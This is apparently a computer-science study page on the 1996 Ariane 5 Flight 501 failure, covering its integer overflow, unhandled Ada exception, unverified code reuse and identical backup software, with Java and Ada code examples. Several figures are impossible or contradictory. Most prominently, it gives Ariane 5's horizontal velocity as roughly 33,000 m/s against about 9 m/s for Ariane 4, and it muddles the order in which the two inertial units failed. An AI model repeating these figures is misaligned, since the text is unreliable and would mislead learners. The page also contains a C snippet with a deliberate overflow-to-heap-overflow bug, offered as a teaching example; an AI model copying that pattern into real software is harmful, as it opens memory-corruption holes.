---
id: CSF-079
title: "Ariane 5 Overflow Bug (1996)"
category: CS Fundamentals - Paradigms
tier: tier-1-foundations
folder: CSF-cs-fundamentals
difficulty: ★★☆
depends_on: CSF-072
used_by:
related: CSF-072, CSF-078, CSF-077, CSF-073
tags: [ariane-5, integer-overflow, software-safety, reuse-failure, historical-case-study]
status: complete
version: 4
layout: default
parent: "CS Fundamentals - Paradigms"
grand_parent: "Technical Mastery"
nav_order: 79
permalink: /technical-mastery/csf/ariane-5-overflow-bug-1996/
---

⚡ TL;DR - Ariane 5 (June 4, 1996): the first launch. 37 seconds after
liftoff: self-destructed. Cost: $370 million (rocket + payload). Root cause:
64-bit floating-point to 16-bit integer conversion OVERFLOW in the inertial
reference system (SRI). The horizontal velocity value was too large for
a 16-bit integer. An unhandled Ada exception in the backup SRI was
propagated as flight data to the flight computer. The flight computer
interpreted the exception data as valid attitude data, commanded extreme
attitude correction, aerodynamic forces broke the rocket apart. The SRI
code was REUSED from Ariane 4, verified for ARIANE 4's flight envelope,
never tested against Ariane 5's higher horizontal velocity.

| #079 | Category: CS Fundamentals - Paradigms | Difficulty: ★★☆ |
|:---|:---|:---|
| **Depends on:** | CSF-072 (Undefined Behaviour - integer overflow) | |
| **Used by:** | (referenced in software safety, code reuse, numeric overflow lessons) | |
| **Related:** | CSF-072 (UB/Overflow), CSF-078 (Therac-25), CSF-077 (Correctness), CSF-073 (Memory Safety) | |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**

Code reuse is universally promoted as good engineering: DRY (Don't Repeat Yourself),
reuse proven components, avoid re-implementing what already works. The Ariane 4 SRI
(inertial reference system) software: 10+ years of operational history. Hundreds of
successful Ariane 4 launches. Thoroughly tested. Formally verified against the Ariane 4
specification. Re-implementing it for Ariane 5: expensive and risky (introducing new bugs).
CNES (the French space agency) and Ariane's software team reused the Ariane 4 SRI code.
Reasonable decision. Except: ONE ASSUMPTION in the original Ariane 4 code was violated
by Ariane 5's different trajectory. The horizontal velocity of Ariane 5 after liftoff:
much higher than Ariane 4's. The SRI code had a 16-bit integer for horizontal velocity.
Ariane 4: never exceeded 16-bit integer max (32,767). Ariane 5: exceeded it 37 seconds
into flight. One unchecked integer conversion. $370 million. Mission destroyed.

**THE INVENTION MOMENT:**

The Ariane 5 incident (1996) produced one of the most thorough post-incident software
analyses in history: the Inquiry Board report (Dowson, 1997) is still cited in software
engineering courses worldwide.

Key findings that changed industry practices:
1. Integer overflow in safety-critical code: MUST be explicitly checked.
2. Code reuse: REQUIRES re-verification against the new system's operational envelope.
3. Exception handling in safety-critical code: hardware diagnostic exceptions (Ada exception)
   CANNOT be forwarded to flight-critical computers as if they were flight data.
4. Redundancy with identical software: the backup SRI failed at the same time for the same
   reason (both ran the same buggy code). Common-cause failure. Redundancy requires
   INDEPENDENT software.

These lessons are now in DO-178C, IEC 61508, and every aerospace software safety standard.

---

### 📘 Textbook Definition

**Ariane 5 Flight 501 (June 4, 1996):** The maiden flight of the Ariane 5 launch vehicle.
Self-destructed 37 seconds after liftoff due to a software error in the inertial reference system.
Total mission cost: ~$370 million USD.

**Integer Overflow:** When the result of an arithmetic operation exceeds the maximum value
representable in the destination type. Signed integer overflow: undefined behavior in C.
Ada: raises a Constraint_Error exception (but only if exception handling is enabled for the
specific operation). In Ariane 5: a 64-bit floating-point horizontal velocity was converted
to a 16-bit signed integer. If the float value exceeded 32,767: Ada Constraint_Error. The exception
was not caught in the SRI software, causing the SRI to halt and output diagnostic data.

**SRI (Systeme de Reference Inertielle, Inertial Reference System):** The navigation computer
in Ariane 5 that measured and reported the rocket's position, velocity, and attitude (orientation).
Two identical SRIs: primary (active) and backup (hot standby). Both ran the same software.

**Common-Cause Failure:** When two redundant components fail for the SAME reason simultaneously,
defeating the purpose of redundancy. Ariane 5: both SRIs failed for the same reason (same software
bug) at the same time. The redundancy provided zero protection against the software error.

**Operand Range:** The valid numeric range of inputs for which an operation is safe and produces
correct results. The Ariane 4 SRI's integer conversion had an implicit operand range assumption:
horizontal velocity < 32,767. This was verified for Ariane 4. Not verified for Ariane 5.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Ariane 5 (1996): 64-bit float to 16-bit integer overflow in the navigation computer.
The overflow caused an Ada exception that was forwarded to the flight computer as flight data.
Flight computer misinterpreted exception diagnostics as attitude readings, commanded impossible
maneuver, aerodynamic forces destroyed the rocket. Code reused from Ariane 4 without verifying
it against Ariane 5's higher velocity envelope. $370 million.

**One analogy:**

> Imagine a car's speedometer is designed for a car that can go up to 120 mph (expressed
> as a single byte: max 255, which easily fits 120). A new, faster car is built that can
> go 300 mph. The same speedometer code is reused. At 256 mph: the byte overflows to 0.
> The speedometer reads "0 mph." The car's automatic speed limiter (reading the speedometer)
> sees "0 mph" and commands maximum acceleration. The car, already at 300 mph,
> accelerates further. The car disintegrates.
>
> The speedometer code was "proven correct" - for 120 mph cars.
> The new car: exceeds the implicit assumption. No one checked.
> $370 million. 37 seconds.

**One insight:**

The Ariane 5 incident is the definitive case for: VERIFIED CODE IN A NEW CONTEXT
REQUIRES RE-VERIFICATION. The Ariane 4 SRI code was correctly verified FOR ARIANE 4.
That verification said: "this code is correct in Ariane 4's operational envelope."
It did NOT say: "this code is correct for all possible rockets."
The team that reused it assumed "verified for Ariane 4 = verified for all contexts."
This assumption: false.

Every piece of code has ASSUMPTIONS baked in (explicit or implicit). When you reuse code:
ALL of those assumptions must be verified in the new context. This is harder than it sounds
because assumptions are often IMPLICIT (not documented). The Ariane 4 SRI code's implicit
assumption: horizontal velocity never exceeds 32,767 (16-bit signed integer max). No comment in
the code said this. No requirement document explicitly stated "this code is only valid for
Ariane 4 velocity profiles." The assumption was embedded in the TYPE CHOICE (int16 instead of int32).

LESSON: When reusing code, the first question must be: "What assumptions does this code make
about its inputs? Are those assumptions still valid in the new context?"

---

### 🔩 First Principles Explanation

**THE OVERFLOW CHAIN:**

```
┌──────────────────────────────────────────────────────┐
│ ARIANE 5 FLIGHT 501 - FAILURE CHAIN:                 │
│                                                      │
│ T+0s: Liftoff. All systems nominal.                  │
│                                                      │
│ T+36.7s:                                             │
│ SRI software computing horizontal bias (BH):        │
│   - BH is a 64-bit floating-point value             │
│   - BH = horizontal velocity (accelerometer data)  │
│   - BH value at T+36.7s: ~32,767.5 (approx)        │
│     (Ariane 5 accelerates faster than Ariane 4)    │
│   - SRI code: convert BH (float64) -> int16        │
│   - float64 value 32,768.X > INT16_MAX (32,767)    │
│   - Ada: Constraint_Error exception raised          │
│   - EXCEPTION NOT CAUGHT (unprotected conversion)  │
│   - SRI processor: halts                           │
│   - SRI outputs: hardware diagnostic data (not     │
│     valid navigation data)                         │
│                                                      │
│ T+36.7s (same time):                                 │
│ Backup SRI (identical software):                    │
│   - Had already failed 0.05 seconds earlier        │
│     for the same reason (same code, same data)     │
│   - Also outputting: diagnostic data               │
│                                                      │
│ T+36.7s:                                             │
│ Flight Computer (On-Board Computer, OBC):           │
│   - Primary SRI: failed (outputting diagnostic)    │
│   - Backup SRI: failed (outputting diagnostic)     │
│   - OBC: receives diagnostic data from backup SRI  │
│     (failover to backup: backup is also failed)    │
│   - OBC INTERPRETS diagnostic data as VALID        │
│     attitude data (no detection of "this is        │
│     diagnostic output, not navigation data")       │
│   - Interpreted data: extreme attitude error       │
│     (pointing 90+ degrees off nominal)             │
│   - OBC: commands maximum attitude correction      │
│                                                      │
│ T+39s:                                               │
│ Nozzle deflection: near maximum extent.             │
│ Aerodynamic forces on the rocket body: catastrophic.│
│ Rocket: breaks apart.                               │
│ Self-destruct activated by range safety.           │
│ Cost: $370M (rocket + payload: 4 Cluster satellites)│
└──────────────────────────────────────────────────────┘
```

**THE KEY DECISIONS THAT CAUSED THE FAILURE:**

```
┌──────────────────────────────────────────────────────┐
│ DECISION 1: Use int16 for horizontal velocity        │
│   Original rationale: Ariane 4 horizontal velocity  │
│   always < 32,767 m/s during SRI alignment.         │
│   (The conversion only ran during alignment phase.) │
│   Ariane 5: different trajectory, higher velocity.  │
│   Result: overflow at T+36.7s.                      │
│                                                      │
│ DECISION 2: Do not catch the Ada Constraint_Error   │
│   Rationale: if exception raised, SRI is            │
│   fundamentally broken. Just halt and output       │
│   diagnostic data. (Reasonable for Ariane 4 where  │
│   the exception could not happen in flight.)        │
│   Result: diagnostic data sent to flight computer. │
│                                                      │
│ DECISION 3: Reuse Ariane 4 SRI without re-verifying │
│   Rationale: cost savings, proven code, fewer risks.│
│   Missing: verification of operand ranges for      │
│   Ariane 5's different flight envelope.             │
│                                                      │
│ DECISION 4: Identical software in backup SRI        │
│   Rationale: simplicity, cost. Backup = exact copy. │
│   Result: common-cause failure. No protection.     │
│                                                      │
│ DECISION 5: OBC accepts SRI output without checking │
│   whether it is diagnostic data vs navigation data. │
│   Result: diagnostic data misinterpreted as flight  │
│   data. Commanded impossible attitude correction.  │
└──────────────────────────────────────────────────────┘
```

---

### 🧪 Thought Experiment

**THE OPERAND RANGE ANALYSIS THAT SHOULD HAVE BEEN DONE:**

Before deploying Ariane 4 SRI code in Ariane 5, the required analysis:

```
OPERAND RANGE ANALYSIS for SRI software on Ariane 5:

Component: BH (horizontal bias) calculation
   Purpose: compute horizontal velocity for inertial reference
   Code: int16_t bh = (int16_t) horizontal_velocity_float64;
   Ariane 4 max horizontal velocity at T+36.7s: ~9 m/s (alignment phase)
   Ariane 5 max horizontal velocity at T+36.7s: ~32,767 m/s (faster trajectory)

   int16_t range: -32,768 to +32,767
   Ariane 4: horizontal_velocity_float64 < 32,767 ALWAYS -> NO OVERFLOW
   Ariane 5: horizontal_velocity_float64 may exceed 32,767 -> OVERFLOW POSSIBLE

   REQUIRED ACTION: Either:
   (a) Change int16_t to int32_t (or float64) for this variable in Ariane 5 context.
   (b) Add runtime bounds check before conversion:
       if (velocity > INT16_MAX) { handle_error(); return; }
   (c) Remove the computation entirely for the Ariane 5 launch phase
       (the BH computation was not needed post-alignment anyway).

The inquiry board found: option (c) was actually the correct fix.
The BH computation was only needed during GROUND ALIGNMENT (before launch).
It was running DURING FLIGHT in Ariane 5 unnecessarily.
After launch: the computation had no use but could still overflow.
FIX: disable the BH computation after the alignment phase is complete.
ONE CONDITIONAL CHECK would have saved $370 million.
```

---

### 🎯 Mental Model / Analogy

**THE REUSE ASSUMPTION CHECKLIST:**

```
┌──────────────────────────────────────────────────────┐
│ CODE REUSE ASSUMPTION CHECKLIST:                     │
│                                                      │
│ BEFORE reusing code in a new context, answer:        │
│                                                      │
│ 1. NUMERIC RANGES:                                   │
│    What are the expected input ranges?              │
│    Are there any integer conversions, casts,        │
│    or arithmetic that assumes bounded values?       │
│    Are those bounds still valid in the new context? │
│                                                      │
│ 2. TIMING AND CONCURRENCY:                          │
│    Does the code assume certain task scheduling?    │
│    Does it use shared variables?                    │
│    Are those concurrency assumptions still valid?   │
│    (Therac-25: same question for mode switching)   │
│                                                      │
│ 3. ENVIRONMENTAL ASSUMPTIONS:                       │
│    What hardware does the code assume?              │
│    What OS services? What latency?                  │
│    Are those assumptions still valid?               │
│                                                      │
│ 4. ERROR HANDLING ASSUMPTIONS:                      │
│    What happens when an error occurs?               │
│    Is the error output safe in the new context?    │
│    (Ariane 5: Ada exception output = diagnostic,   │
│     misinterpreted as flight data in new context)  │
│                                                      │
│ 5. SCOPE OF VALIDITY:                               │
│    What was the original verification scope?        │
│    Does the new use case fall within that scope?   │
└──────────────────────────────────────────────────────┘
```

**MEMORY HOOK:**

"Ariane 5 (1996): 64-bit float -> 16-bit int overflow. BH (horizontal velocity) too large.
Ada Constraint_Error. SRI halts. Outputs diagnostic data. Backup SRI: same bug same time (common-cause failure).
OBC: interprets diagnostic as flight data. Commands extreme attitude correction. Rocket destroyed.
Cost: $370M.
Root causes: (1) int16 for value that exceeded INT16_MAX in new trajectory,
(2) Ada exception not caught = diagnostic data forwarded as flight data,
(3) Ariane 4 code reused WITHOUT re-verifying operand ranges for Ariane 5 velocity envelope,
(4) IDENTICAL software in backup = no protection from common-cause failure.
Fix: disable BH computation after alignment (was not needed in flight anyway).
Lesson: code reuse requires re-verifying all assumptions in the new context."

---

### 📊 Gradual Depth - Five Levels

**Level 1 - Child:**
A number was too big to fit into the box the computer used to store it. The computer got confused
and thought the rocket was spinning when it wasn't. It tried to "fix" the spinning and broke the rocket.
The lesson: make sure your boxes are big enough for the biggest numbers your program will ever use.

**Level 2 - Student:**
Integer overflow - the root mechanism:
```java
// Java: int overflow wraps around silently
int a = Integer.MAX_VALUE; // 2,147,483,647
int b = a + 1;             // -2,147,483,648 (overflow: no exception in Java!)
System.out.println(b);     // prints: -2147483648

// Ariane 5 equivalent (Ada raises exception, Java/C silently wraps):
double horizontal_velocity = 40000.0; // exceeds INT16_MAX (32,767)
short bh = (short) horizontal_velocity; // Java: SILENTLY wraps to 7233
// Ada: RAISES Constraint_Error (exception)

// Safe conversion:
if (horizontal_velocity > Short.MAX_VALUE || horizontal_velocity < Short.MIN_VALUE) {
    throw new ArithmeticException("Horizontal velocity out of int16 range");
}
short bh_safe = (short) horizontal_velocity;

// Or use Java's Math.toIntExact (throws on overflow):
int x = Math.toIntExact(longValue); // throws ArithmeticException on overflow
// No equivalent for float->int, but you can range-check manually.
```

**Level 3 - Professional:**
Ada exception handling in safety-critical context - what should have happened:
```ada
-- Ada: Constraint_Error on numeric overflow (good: at least it's caught)
-- BAD: no exception handler (what Ariane 5 did)
procedure Compute_Horizontal_Bias is
   BH : Integer_16;
   Velocity : Long_Float;
begin
   BH := Integer_16(Velocity); -- Raises Constraint_Error if Velocity > 32767
   -- NO EXCEPTION HANDLER -> exception propagates -> SRI halts
   -- SRI outputs diagnostic data (not flight data)
   -- Flight computer cannot distinguish: misinterprets as flight data
end;

-- BETTER: Handle the exception and output a safe value or status
procedure Compute_Horizontal_Bias_Safe is
   BH : Integer_16;
   Velocity : Long_Float;
begin
   if Velocity > Long_Float(Integer_16'Last) then
       BH := Integer_16'Last; -- saturate, or signal an error flag
       -- OR: Set SRI_Error_Flag := True; return safe default.
   else
       BH := Integer_16(Velocity);
   end if;
exception
   when Constraint_Error =>
       BH := 0;           -- safe default
       -- Signal to flight computer: "BH data unreliable this cycle."
       -- Flight computer: use last known good value or ignore.
end;

-- BEST: REMOVE the computation after alignment phase completes.
-- The BH calculation was only needed during ground alignment.
-- After launch: disable it. No possibility of overflow.
-- Inquiry board recommendation: this was the correct fix.
```

**Level 4 - Senior Engineer:**
Common-cause failure and independent redundancy:
```
ARIANE 5 REDUNDANCY DESIGN:
Primary SRI <---> Backup SRI (IDENTICAL software)
                    |
                    | If primary fails: failover to backup
                    v
              Flight Computer

PROBLEM: Primary and Backup run IDENTICAL software.
If primary fails due to a SOFTWARE BUG: backup has the same bug.
Primary fails -> flight computer switches to backup -> backup also failed.
"Backup" provides ZERO protection against software bugs.

CORRECT REDUNDANCY DESIGN (Common-Cause Failure protection):
Option A: DIVERSE SOFTWARE
  Primary SRI: software written by Team A in Ada
  Backup SRI: software written by Team B in a different language (e.g., C)
  Same specification, different implementation.
  A software bug in Team A's code: unlikely to affect Team B's implementation.
  Cost: 2x development. Benefit: protection from common-cause software failure.

Option B: INDEPENDENT VALIDATION OF REDUNDANT COMPONENTS
  If same software is used: formally verify that the software is correct
  for the full operational envelope of the specific rocket.
  Not: verify for Ariane 4, reuse for Ariane 5.
  Verify for ARIANE 5's operational envelope specifically.

Option C: DIFFERENT ROLES FOR PRIMARY AND BACKUP
  Backup SRI: use a different, simpler algorithm (no overflows).
  Less accurate but reliable fallback.
  Primary: high-accuracy. Backup: safe-but-lower-accuracy.

DO-178C Level A (avionics): diverse software for independent monitoring channels
is the current standard for critical systems. Ariane 5's identical software:
would not meet today's DO-178C requirements for this criticality level.
```

**Level 5 - Expert:**
SPARK Ada: language designed to prevent the Ariane 5 bug:
```ada
-- SPARK Ada: a formally verifiable subset of Ada.
-- Used in modern avionics (Airbus A380 primary flight control).
-- SPARK's flow analysis detects the operand range issue:

-- With SPARK annotations:
procedure Compute_BH
   (Velocity : in Long_Float;
    BH       : out Integer_16)
with Pre  => Velocity >= Long_Float(Integer_16'First) and
             Velocity <= Long_Float(Integer_16'Last),
     Post => True;

-- GNATprove (SPARK verification tool): verifies at COMPILE TIME
-- that the precondition is sufficient for the postcondition.
-- If Velocity could exceed Integer_16'Last anywhere in the program:
-- GNATprove reports: "precondition of Compute_BH might not hold."
-- The Ariane 5 bug: would be detected at COMPILE TIME.
-- No runtime. No flight. Just: a static analysis error message.

-- SPARK is now used in:
-- - Airbus A380 flight control (primary flight control)
-- - UK CHERI Aerospace security
-- - US military avionics (DARPA HACMS project)
-- The Ariane 5 bug cannot happen in SPARK code: the overflow is
-- detected as a precondition violation before the code runs.
```

---

### ⚙️ How It Works

**WHY THE FLIGHT COMPUTER COULDN'T DETECT THE BAD DATA:**

```
┌──────────────────────────────────────────────────────┐
│ OBC (FLIGHT COMPUTER) DESIGN FLAW:                   │
│                                                      │
│ Normal operation:                                    │
│ SRI sends: navigation data (attitude, velocity)      │
│ OBC receives: navigation data                        │
│                                                      │
│ After SRI failure (diagnostic output):              │
│ SRI sends: diagnostic / error data                  │
│ OBC receives: same interface (same bus format)      │
│ OBC: NO WAY to distinguish diagnostic from nav data  │
│                                                      │
│ Root cause: the SRI's diagnostic output WAS IN THE  │
│ SAME FORMAT as normal navigation data on the bus.  │
│ The SRI used a single output channel for BOTH.     │
│ The OBC had no separate "health/status" channel.   │
│                                                      │
│ CORRECT DESIGN:                                      │
│ Separate channels:                                  │
│   Navigation bus: valid navigation data only        │
│   Status/health bus: diagnostic, error, status data │
│ OBC: reads navigation bus for control.              │
│      reads status bus for health monitoring.        │
│      If status = FAILED: use last known good value,  │
│      engage safe mode, alert operator.              │
│ SRI failure: outputs to STATUS bus, NOT NAV bus.    │
│ OBC: never misinterprets diagnostic as navigation.  │
└──────────────────────────────────────────────────────┘
```

---

### 💻 Code Example

**Example 1 - Wrong vs Right: Overflow-Safe Type Conversion**

```java
// BAD: Silent overflow (C/Java style) - Ariane 5 equivalent in Java
class NavigationComputer {
    // BAD: assumes velocity fits in short (INT16 equivalent)
    public short computeHorizontalBias(double velocityMsec) {
        return (short) velocityMsec; // SILENT overflow if > 32,767
        // Ariane 5: velocity was ~32,768 -> short = -32,768
        // Returned to flight computer as -32,768 (huge negative)
        // Flight computer: interprets as extreme attitude error
    }
}

// GOOD: Explicit range check before conversion
class NavigationComputerV2 {
    private static final double BH_MAX = Short.MAX_VALUE; // 32,767
    private static final double BH_MIN = Short.MIN_VALUE; // -32,768

    public short computeHorizontalBias(double velocityMsec)
            throws NavigationException {
        if (velocityMsec > BH_MAX || velocityMsec < BH_MIN) {
            // SAFE FAILURE: do not return garbage data.
            // Log the error. Optionally: saturate to safe limit,
            // but flag data as unreliable to consumers.
            throw new NavigationException(
                "Horizontal velocity out of INT16 range: " + velocityMsec +
                ". Valid range: [" + BH_MIN + ", " + BH_MAX + "]");
        }
        return (short) velocityMsec;
    }
}

// BETTER (Ariane 5 actual fix):
// After alignment phase completes, DISABLE the BH computation entirely.
// It is not needed in flight. Remove the opportunity for the overflow.
class NavigationComputerV3 {
    private boolean alignmentPhaseComplete = false;

    public void setAlignmentComplete() { alignmentPhaseComplete = true; }

    public Optional<Short> computeHorizontalBias(double velocityMsec) {
        if (alignmentPhaseComplete) {
            return Optional.empty(); // Not needed after alignment. Skip.
        }
        if (velocityMsec > Short.MAX_VALUE || velocityMsec < Short.MIN_VALUE) {
            return Optional.empty(); // Out of range: skip, signal health monitor
        }
        return Optional.of((short) velocityMsec);
    }
}
```

**Example 2 - Failure: Common-Cause Failure in Redundant Systems**

```java
// BAD: Identical code in primary and backup (common-cause failure)
class SRI {
    // EXACT SAME CODE in both primary and backup SRI.
    // Same bug in both.
    short horizontalBias;

    void update(double velocity) {
        horizontalBias = (short) velocity; // OVERFLOW if velocity > 32767
        // Ariane 5: BOTH primary and backup fail simultaneously.
    }
}

class FlightComputer {
    SRI primarySRI;
    SRI backupSRI;

    // Failover: if primary fails, use backup.
    // But: backup has the SAME BUG. Backup also failed.
    // Failover: goes to an already-failed system. Zero protection.
    short getHorizontalBias() {
        try {
            return primarySRI.getHorizontalBias();
        } catch (SRIFailureException e) {
            // "Failover to backup" - but backup is also failed!
            return backupSRI.getHorizontalBias(); // same bug, same failure
        }
    }
}

// BETTER: Different implementations for primary and backup
class PrimarySRI {
    // High-accuracy implementation. Raises exception on overflow.
    short horizontalBias;
    void update(double velocity) {
        if (velocity > Short.MAX_VALUE)
            throw new SRIException("Velocity out of range");
        horizontalBias = (short) velocity;
    }
}

class BackupSRI {
    // DIFFERENT IMPLEMENTATION: simpler, more conservative, no overflow risk.
    // Uses double precision throughout, no int16 conversion.
    double horizontalBias; // double: no overflow risk
    void update(double velocity) {
        horizontalBias = velocity; // no conversion, no overflow possible
    }
    short getHorizontalBias() {
        // Safe conversion with saturation:
        return (short) Math.min(Short.MAX_VALUE,
                       Math.max(Short.MIN_VALUE, horizontalBias));
    }
}
// Primary fails: backup with DIFFERENT implementation handles the overflow safely.
// Diverse software = protection against common-cause software failure.
```

---

### ⚖️ Comparison Table

| Aspect | Ariane 4 SRI | Ariane 5 SRI (original reused code) | Ariane 5 SRI (after fix) |
|---|---|---|---|
| Max horizontal velocity | ~9 m/s at T+37s | ~33,000 m/s at T+37s | N/A (disabled after alignment) |
| int16 overflow risk | None (always < 32,767) | YES (exceeds 32,767 at T+37s) | N/A (computation disabled) |
| BH computation in flight | Not needed (alignment only) | Running unnecessarily | Disabled after alignment complete |
| Exception handling | Not needed (cannot happen) | Not handled (crash if raised) | Moot (computation disabled) |
| Verification status | Verified for Ariane 4 | Assumed valid (not re-verified) | Re-verified for Ariane 5 |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "The Ariane 5 incident was caused by Ada's exception mechanism" | Ada's exception mechanism was a SYMPTOM, not a cause. Ada CORRECTLY raised a Constraint_Error when the integer conversion overflowed. This is the RIGHT behavior (detected the problem). The flaw: the exception was UNHANDLED, causing the SRI to terminate and output diagnostic data. And the DEEPER flaw: the integer overflow should never have been possible (the computation should have been disabled after alignment). Blaming Ada's exceptions is like blaming a smoke alarm for not putting out a fire. Ada's exception was the correct alarm. The problem: (1) the fire (overflow) happened, (2) there was no plan for when the alarm went off. Languages that silently overflow (C, Java `int + int`) would have been WORSE: the overflow would have produced a nonsense int16 value, sent to the flight computer as a valid navigation value, with no exception and no alarm. Ada at least raised the alarm. The problem was the response to the alarm. |
| "A larger integer type would have fully fixed the problem" | A 32-bit or 64-bit integer for the horizontal velocity conversion WOULD have prevented the specific overflow that destroyed Ariane 5. But the inquiry board's recommended fix was more fundamental: DISABLE THE COMPUTATION after the alignment phase, because it was not needed in flight. A larger integer type: prevents THIS overflow, but the same horizontal velocity would eventually exceed a 32-bit integer on a sufficiently fast rocket. The CORRECT fix: remove unnecessary computations in safety-critical software. Every computation that doesn't need to run: is a computation that cannot fail. Defense in depth principle: if the BH computation is not needed in flight, it should not run in flight. Disabling it entirely: eliminates the overflow risk for all future rocket designs (regardless of velocity), not just for Ariane 5's current velocity. |
| "The backup SRI would have saved the mission with different software" | YES - diverse software in the backup SRI was the correct lesson. The backup SRI ran IDENTICAL software: common-cause failure. Both failed simultaneously. A backup with different software (e.g., using float64 throughout, with no int16 conversion) would not have overflowed. The backup SRI would have remained operational. The flight computer would have received valid navigation data from the backup. The mission would have continued. The lesson is precisely this: REDUNDANCY ONLY HELPS IF THE FAILURE MODES ARE INDEPENDENT. Same software in primary and backup: provides zero protection against software bugs (only protects against hardware failures). Diverse software: protects against software bugs in the primary (backup has different code, different failure modes). Cost: 2x development effort. Benefit: mission success. For a $370M rocket: 2x SRI development cost is trivially small. |
| "The developers were negligent or incompetent" | The developers were following a rational process: reuse proven, verified code to reduce risk and cost. The Ariane 4 SRI had an excellent safety record. The error was not in the SRI code itself (which was correct for Ariane 4): it was in the PROCESS of re-validation when reusing the code for Ariane 5. The process should have included an operand range analysis for all conversions in the reused code against the new rocket's operational envelope. This analysis was not performed (or not performed thoroughly enough). The root cause is a PROCESS GAP, not individual incompetence. The inquiry board was careful to focus on process recommendations, not individual blame. The lesson: even experienced, skilled engineers using proven code can fail to catch this class of bug if the re-validation process is inadequate. IEC 61508, DO-178C, and ECSS-E-ST-40C (space software standard) now require explicit operand range analysis when reusing software components. |

---

### 🚨 Failure Modes & Diagnosis

**Failure Mode 1: Integer Overflow in Numeric Processing (Silent or Exception)**

**Symptom:** Unexpected negative values, NaN, or exception/crash in numeric calculation.
Results are correct for most inputs but wrong for extreme values.

**Diagnosis:**
```java
// Static analysis: find all integer conversions (casts) in safety-critical code
// Java: FindBugs/SpotBugs with CAST_INT rule, SonarQube
// C: -Wconversion (GCC/Clang), sanitizers: -fsanitize=integer

// Manual code review checklist:
// 1. Find all: (int)longValue, (short)intValue, (int)floatValue
// 2. For each: what is the max possible value of the source?
// 3. Does the max possible value exceed the destination type's range?
// 4. If yes: add range check, use larger type, or restructure.

// Safe conversion with explicit check (Java):
static short safeDoubleToShort(double value, String context) {
    if (value > Short.MAX_VALUE || value < Short.MIN_VALUE || Double.isNaN(value)) {
        throw new ArithmeticException(
            context + ": value " + value + " out of short range [" +
            Short.MIN_VALUE + ", " + Short.MAX_VALUE + "]");
    }
    return (short) value;
}

// Test with boundary values (property-based testing approach):
// Test inputs: Short.MAX_VALUE - 1, Short.MAX_VALUE, Short.MAX_VALUE + 1, 0, -1
// These are the values that expose overflow bugs.

// Java Math.toIntExact(long value): throws ArithmeticException on overflow.
// Use for long->int conversion in production code.
```

---

**Security Note:**

Integer overflow is a SECURITY vulnerability as well as a safety issue:

1. **Integer overflow -> underallocation (Ariane 5 pattern in security context):**
   ```c
   // CVE pattern: integer overflow in size calculation
   size_t allocate_buffer(uint32_t count, size_t item_size) {
       // Ariane 5 analog: overflow in size calculation
       size_t total = count * item_size; // OVERFLOW if count * item_size > SIZE_MAX
       return malloc(total); // allocates tiny buffer
       // Caller: writes count * item_size bytes -> heap overflow
   }
   ```
   Same mechanism as Ariane 5: a value exceeds the type's range, producing a wrong result
   that is then used for a dangerous operation. In Ariane 5: the wrong value was used for
   attitude control. In a security context: the wrong value is a tiny allocation size
   followed by a heap overflow write.

2. **`Math.multiplyExact()` for financial calculations:**
   ```java
   // Safe multiplication in Java: throws on overflow
   long totalAmount = Math.multiplyExact(quantity, unitPrice);
   // If overflow: ArithmeticException (not wrong silent value)
   // Use for: financial amounts, allocation sizes, any safety-critical arithmetic
   ```

3. **DoS via overflow in network protocol parsing:**
   Attacker sends a packet claiming length = 2GB (a large value). If the server's
   length parsing has an integer overflow (length * 4 bytes overflows to 0 or small value):
   the server allocates a tiny buffer, then reads the full 2GB into it. OOM or heap overflow.
   Defense: validate all length fields against maximum allowable sizes before using them
   in allocations.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**
- `Undefined Behaviour in Language Specs` (CSF-072) - integer overflow as UB in C, as exception in Ada

**Builds On This (learn these next):**
- `Therac-25 Incident (1985)` (CSF-078) - companion case study in software safety failures
- `Software Correctness and Proof` (CSF-077) - operand range analysis as correctness technique

---

### 📌 Quick Reference Card

```
┌────────────────────────────────────────────────────────┐
│ WHAT      │ Ariane 5 rocket, June 4, 1996. Destroyed  │
│           │ 37 seconds after liftoff. $370M.           │
├───────────┼─────────────────────────────────────────┤
│ ROOT CAUSE│ float64 -> int16 overflow in SRI.         │
│           │ Horizontal velocity exceeded INT16_MAX.   │
│           │ Unhandled Ada Constraint_Error.            │
├───────────┼─────────────────────────────────────────┤
│ CHAIN     │ SRI outputs diagnostic data -> OBC        │
│           │ interprets as flight data -> max attitude  │
│           │ correction -> rocket breaks up.            │
├───────────┼─────────────────────────────────────────┤
│ REUSE BUG │ Ariane 4 SRI code reused without         │
│           │ re-verifying for Ariane 5's higher vel.   │
├───────────┼─────────────────────────────────────────┤
│ COM-CAUSE │ Backup SRI identical software.            │
│           │ Both fail simultaneously. No protection.  │
├───────────┼─────────────────────────────────────────┤
│ FIX       │ Disable BH computation after alignment.  │
│           │ (Not needed in flight. Never was.)        │
├───────────┼─────────────────────────────────────────┤
│ LESSONS   │ Overflow checks in safety-critical code. │
│           │ Reuse = re-verify operational envelope.  │
│           │ Diverse software for independent backup.  │
│           │ Fail-safe diagnostic output (not flight   │
│           │ data channel).                            │
├───────────┼─────────────────────────────────────────┤
│ NEXT      │ CSF-078 (Therac-25), CSF-077 (Correctness)│
└───────────┴─────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. The Ariane 5 root cause was a float64-to-int16 conversion overflow. Horizontal velocity at T+36.7s
   exceeded INT16_MAX (32,767). Ada raised Constraint_Error. The exception was unhandled: the SRI
   halted and output diagnostic data. The flight computer interpreted the diagnostic data as valid
   flight data and commanded an impossible attitude correction. This is the overflow chain: wrong
   numeric type -> exception -> unhandled exception -> diagnostic data on flight bus -> misinterpretation
   -> wrong control input -> physical destruction. One integer type decision. $370 million.
2. Code reuse requires re-verification in the new operational context. The Ariane 4 SRI was
   correctly verified for Ariane 4's flight envelope. When reused for Ariane 5: the team assumed
   "verified for Ariane 4 = valid everywhere." The assumption was wrong. Ariane 5's higher horizontal
   velocity violated the implicit operand range assumption of the int16 type. The required action:
   operand range analysis for every numeric conversion in the reused code, checked against the NEW
   rocket's velocity envelope. This analysis was not performed. Lesson: when reusing code in a new
   context, always ask "what does this code assume about its inputs? Are those assumptions still valid?"
3. Redundancy only helps if failure modes are independent. The backup SRI had IDENTICAL software.
   Both failed simultaneously (common-cause failure). The backup provided zero protection against
   the software bug. Diverse software (different implementation, different language, different team):
   the backup would have had a different failure mode and remained operational. For all redundant
   safety systems: verify that the redundant components have INDEPENDENT failure modes. Same software
